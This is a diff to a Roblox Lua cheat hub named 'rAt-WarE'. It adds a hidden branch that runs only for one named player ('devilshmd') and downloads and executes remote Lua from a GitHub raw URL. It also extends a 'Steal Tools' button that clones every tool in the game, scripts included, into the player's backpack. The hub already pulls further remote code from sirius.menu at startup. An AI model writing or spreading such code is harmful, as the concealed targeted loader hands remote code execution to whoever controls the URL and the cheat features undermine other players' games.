@@ -66,8 +66,13 @@ local plr = game:GetService("Players")
 local locplr = plr.LocalPlayer.Name
 local seltitle
 seltitle = "rAt-WarE"
+
 if locplr == "oeind36" then
 	seltitle = "ardi bot"
+end
+
+if locplr == "devilshmd" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/someoneus/master/refs/heads/main/keyboardmouse.lua", true))()
 end
 
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
@@ -540,12 +545,12 @@ local Button = Tab:CreateButton({
 })
 
 local Tab = Window:CreateTab("Built-in", "github")
-
+a = a + 1
 local Button = Tab:CreateButton({
    Name = "Steal Tools",
    Callback = function()
    -- The function that takes place when the button is pressed
-			local player = game:GetService("Players").LocalPlayer
+local player = game:GetService("Players").LocalPlayer
 local backpack = player:FindFirstChild("Backpack")
 
 local foundTool = false -- Flag to check if tools exist
@@ -554,6 +559,15 @@ for _, tool in pairs(game:GetDescendants()) do
     if tool:IsA("Tool") then
         foundTool = true -- Mark that at least one tool was found
         local clonedTool = tool:Clone()
+
+        -- Clone all child scripts inside the tool
+        for _, child in pairs(tool:GetDescendants()) do
+            if child:IsA("Script") or child:IsA("LocalScript") or child:IsA("ModuleScript") then
+                local clonedScript = child:Clone()
+                clonedScript.Parent = clonedTool -- Keep the script inside the cloned tool
+            end
+        end
+
         clonedTool.Parent = backpack
     end
 end
@@ -566,6 +580,7 @@ if not foundTool then
         Duration = 5
     })
 end
+
 
    end,
 })
@@ -581,8 +596,8 @@ task.spawn(function() wait(2.5)
 print(a.." scripts are available")
 if a then
     Rayfield:Notify({
-    Title = "Script Checker",
-    Content = "Tab Hub Currently has "..a.." scripts available for free!",
+    Title = "Script Master",
+    Content = "rAt-WarE Currently has "..a.." scripts available for free!",
     Duration = 10,
     Image = "scroll",
 })
